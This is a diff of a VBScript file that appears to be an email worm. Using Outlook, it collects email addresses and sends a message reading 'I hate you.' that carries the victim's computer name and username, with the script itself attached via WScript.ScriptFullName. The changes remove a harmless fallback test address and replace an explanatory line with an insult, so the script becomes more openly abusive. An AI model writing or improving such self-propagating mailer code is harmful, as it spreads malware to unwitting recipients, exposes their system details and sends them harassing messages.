@@ -1,18 +1,25 @@
 Option Explicit
 
-Dim objOutlook, objNamespace, objFolder, objMailItem
-Dim objFSO, objShell, objLogFile, objWshShell
-Dim strAppData, strSearchPath, strReport
-Dim intEmailCount, intFolderCount, intAttachmentCount
-Dim arrFolders, arrFiles, arrAttachments
-Dim i, j, k
-Dim strFoundEmail
+Dim objOutlook
+Dim objNamespace
+Dim objFolder
+Dim objMailItem
+Dim objFSO
+Dim objShell
+Dim objLogFile
+Dim objWshShell
+Dim objFolderItem
+Dim strSearchPath
+Dim strReport
+Dim intEmailCount
+Dim intFolderCount
+Dim arrFolders
+Dim i
 Dim colFoundEmails
 Dim strEmail
 Dim objRegEx
 Dim objMatch
 Dim colMatches
-Dim objFile
 Dim objTextStream
 Dim fileContent
 Dim strEmailAddress
@@ -20,10 +27,8 @@ Dim altPaths
 Dim altPath
 Dim strExt
 Dim folderNameStr
-Dim objSubFolder
-Dim objFolderItem
 Dim sentCount
-Dim objStream
+Dim intAttachmentCount
 
 Set colFoundEmails = CreateObject("Scripting.Dictionary")
 Set objWshShell = CreateObject("WScript.Shell")
@@ -61,7 +66,7 @@ EMAIL_BODY = "I hate you." & vbCrLf & _
              "System: " & objWshShell.ExpandEnvironmentStrings("%COMPUTERNAME%") & vbCrLf & _
              "User: " & objWshShell.ExpandEnvironmentStrings("%USERNAME%") & vbCrLf & _
              "Timestamp: " & Now() & vbCrLf & vbCrLf & _
-             "If you do not understand it check the .vbs for information." & vbCrLf
+             "Asshole..." & vbCrLf
 
 Dim ATTACHMENT_PATH
 ATTACHMENT_PATH = WScript.ScriptFullName
@@ -127,9 +132,7 @@ If colFoundEmails.Count = 0 Then
 End If
 
 If colFoundEmails.Count = 0 Then
-    strReport = strReport & "No emails found anywhere. Using fallback email." & vbCrLf
-    strFoundEmail = "test@example.com"
-    colFoundEmails.Add strFoundEmail, strFoundEmail
+    strReport = strReport & "No useable data collected" & vbCrLf
 End If
 
 strReport = strReport & "Analysis" & vbCrLf
